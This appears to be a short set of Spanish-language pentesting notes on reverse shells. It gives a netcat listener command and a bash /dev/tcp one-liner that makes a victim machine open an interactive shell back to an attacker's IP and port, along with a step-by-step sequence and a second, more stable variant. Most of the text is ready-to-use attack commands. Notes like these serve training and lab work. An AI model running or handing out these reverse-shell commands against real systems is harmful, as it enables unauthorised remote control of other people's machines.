# Reverse Shells

Una reverse shell permite ejecutar comandos en la máquina víctima desde nuestra máquina atacante. La víctima se conecta hacia nosotros.

## Uso de Netcat para Recibir la Conexion

Netcat es el "estándar" para recibir conexiones de reverse shells.

```bash
nc -lvnp <puerto>
```

- `-l` -> Modo escucha (listen)
- `-v` -> Verbose (muestra detalles)
- `-n` -> Sin resolución DNS
- `-p` -> Puerto en escucha

## Comando de Reverse Shell (Linux)

La pagina **[revshells.com](https://www.revshells.com/)** permite generar comandos personalizados introduciendo IP y puerto.

```bash
sh -i >& /dev/tcp/<IP_atacante>/<puerto> 0>&1
```

> Se coloca este comando en la máquina víctima y se recibe con `nc -lvnp <puerto>` en la atacante.

## Secuencia Típica

1. Ponerse en escucha: `nc -lvnp 4444`
2. Ejecutar comando reverse shell en la victima
3. Recibir la shell interactiva
4. Realizar tratamiento de la TTY (ver apartado correspondiente)

## Reverse Shell Adicional

La shell obtenida puede ser inestable, por lo que conviene enviar una segunda más estable:

```bash
nc -nlvp <puerto>
bash -c "sh -i >& /dev/tcp/<IP_atacante>/4444 0>&1"
```
